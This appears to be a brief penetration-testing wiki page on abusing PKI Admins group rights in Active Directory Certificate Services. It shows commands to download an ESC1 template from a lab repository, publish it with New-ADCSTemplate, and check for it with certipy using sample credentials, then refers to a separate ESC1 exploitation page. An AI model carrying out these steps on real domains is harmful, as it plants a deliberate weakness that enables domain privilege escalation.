# PKI Admin Group Privilege Escalation

## PKI Admin Group Privilege Escalation [t-ad-adcs-pki_admins_group]

### Overview

PKI Admin Group Privilege Escalation


### References:

* [https://github.com/GoateePFE/ADCSTemplate](https://github.com/GoateePFE/ADCSTemplate)

* [https://github.com/Orange-Cyberdefense/GOAD/blob/4cc6cbc1bdc86a236649d6c1e2c0dbf856bedeb6/ansible/roles/adcs_templates/files/ESC1.json](https://github.com/Orange-Cyberdefense/GOAD/blob/4cc6cbc1bdc86a236649d6c1e2c0dbf856bedeb6/ansible/roles/adcs_templates/files/ESC1.json)

### 1.1 Download a vulnerable template



{% code overflow="wrap" %}
```bash
wget https://raw.githubusercontent.com/Orange-Cyberdefense/GOAD/4cc6cbc1bdc86a236649d6c1e2c0dbf856bedeb6/ansible/roles/adcs_templates/files/ESC1.json
```
{% endcode %}

### 1.2 Add a vulnerable template to the ADCS server



{% code overflow="wrap" %}
```bash
New-ADCSTemplate -DisplayName ESC1 -JSON (Get-Content .\default.json -Raw) -Publish -Identity "CODER\PKI Admins"

```
{% endcode %}

### 1.3 Confirm that the new tamplate has been added



{% code overflow="wrap" %}
```bash
certipy find -u user@domain.com -p 'P@ssw0rd' -dc-ip 10.129.229.10 -debug -target dc.domain.com -vulnerable

```
{% endcode %}

### 1.4 Exploit ECS1 using T-privilege_escalation-win-ad-adcs_esc1



